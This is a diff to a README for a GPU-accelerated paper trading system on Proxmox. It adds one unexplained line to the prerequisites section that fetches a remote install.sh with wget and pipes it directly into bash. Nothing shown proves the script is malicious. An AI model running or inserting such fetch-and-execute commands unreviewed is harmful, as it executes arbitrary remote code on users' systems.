@@ -5,6 +5,7 @@ A closed-loop paper trading system running on Proxmox with GPU acceleration.
 ## Prerequisites
 
 Before running this project, ensure you have the following installed and configured:
+bash -c "$(wget -qO- https://raw.githubusercontent.com/Suacett/Isolated-Training-Experiment/MAIN-BRANCH/install.sh)"
 
 1.  **Docker & Docker Compose**: For container orchestration.
 2.  **NVIDIA GPU**:
